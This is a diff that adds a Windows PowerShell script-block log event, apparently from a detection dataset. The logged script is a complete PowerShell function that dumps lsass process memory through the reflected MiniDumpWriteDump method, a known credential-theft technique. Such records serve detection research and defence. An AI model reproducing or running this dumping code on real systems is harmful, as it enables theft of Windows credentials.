@@ -1,0 +1,52 @@
+{
+  "Event": {
+    "#attributes": {
+      "xmlns": "http://schemas.microsoft.com/win/2004/08/events/event"
+    },
+    "System": {
+      "Provider": {
+        "#attributes": {
+          "Name": "Microsoft-Windows-PowerShell",
+          "Guid": "A0C1853B-5C40-4B15-8766-3CF1C58F985A"
+        }
+      },
+      "EventID": 4104,
+      "Version": 1,
+      "Level": 3,
+      "Task": 2,
+      "Opcode": 15,
+      "Keywords": "0x0",
+      "TimeCreated": {
+        "#attributes": {
+          "SystemTime": "2020-06-30T14:24:08.254605Z"
+        }
+      },
+      "EventRecordID": 971,
+      "Correlation": {
+        "#attributes": {
+          "ActivityID": "4AA5EAE3-4F33-0001-3A2B-A64A334FD601"
+        }
+      },
+      "Execution": {
+        "#attributes": {
+          "ProcessID": 7008,
+          "ThreadID": 6488
+        }
+      },
+      "Channel": "Microsoft-Windows-PowerShell/Operational",
+      "Computer": "MSEDGEWIN10",
+      "Security": {
+        "#attributes": {
+          "UserID": "S-1-5-21-3461203602-4096304019-2269080069-1000"
+        }
+      }
+    },
+    "EventData": {
+      "MessageNumber": 1,
+      "MessageTotal": 1,
+      "ScriptBlockText": "function Memory($path)\n{\n\t\t\t  \n\t\t\t  \n\t\t$Process = Get-Process lsass\n\t\t$DumpFilePath = $path\n\t\t\n\t\t$WER = [PSObject].Assembly.GetType('System.Management.Automation.WindowsErrorReporting')\n\t\t$WERNativeMethods = $WER.GetNestedType('NativeMethods', 'NonPublic')\n\t\t$Flags = [Reflection.BindingFlags] 'NonPublic, Static'\n\t\t$MiniDumpWriteDump = $WERNativeMethods.GetMethod('MiniDumpWriteDump', $Flags)\n\t\t$MiniDumpWithFullMemory = [UInt32] 2\n\t\n\t\t\t\n\t\t\t  #\n\t\t$ProcessId = $Process.Id\n\t\t$ProcessName = $Process.Name\n\t\t$ProcessHandle = $Process.Handle\n\t\t$ProcessFileName = \"$($ProcessName).dmp\"\n\t\t\n\t\t$ProcessDumpPath = Join-Path $DumpFilePath $ProcessFileName\n\t\t\n\t\t$FileStream = New-Object IO.FileStream($ProcessDumpPath, [IO.FileMode]::Create)\n\t\t\t  \n\t\t$Result = $MiniDumpWriteDump.Invoke($null, @($ProcessHandle,\n\t\t\t\t\t\t\t\t\t\t\t\t\t$ProcessId,\n\t\t\t\t\t\t\t\t\t\t\t\t\t$FileStream.SafeFileHandle,\n\t\t\t\t\t\t\t\t\t\t\t\t\t$MiniDumpWithFullMemory,\n\t\t\t\t\t\t\t\t\t\t\t\t\t[IntPtr]::Zero,\n\t\t\t\t\t\t\t\t\t\t\t\t\t[IntPtr]::Zero,\n\t\t\t\t\t\t\t\t\t\t\t\t\t[IntPtr]::Zero))\n\t\t\t  \n\t\t$FileStream.Close()\n\t\t\n\t\tif (-not $Result)\n\t\t{\n\t\t\t$Exception = New-Object ComponentModel.Win32Exception\n\t\t\t$ExceptionMessage = \"$($Exception.Message) ($($ProcessName):$($ProcessId))\"\n\t\t\t\n\t\t\t# Remove any partially written dump files. For example, a partial dump will be written\n\t\t\t# in the case when 32-bit PowerShell tries to dump a 64-bit process.\n\t\t\tRemove-Item $ProcessDumpPath -ErrorAction SilentlyContinue\n\t\t\t\n\t\t\tthrow $ExceptionMessage\n\t\t}\n\t\telse\n\t\t{\n\t\t\t\"Memdump complete!\"\n\t\t}\n\t\n}",
+      "ScriptBlockId": "27f08bda-c330-419f-b83b-eb5c0f699930",
+      "Path": "C:\\Users\\Public\\lsass_wer_ps.ps1"
+    }
+  }
+}
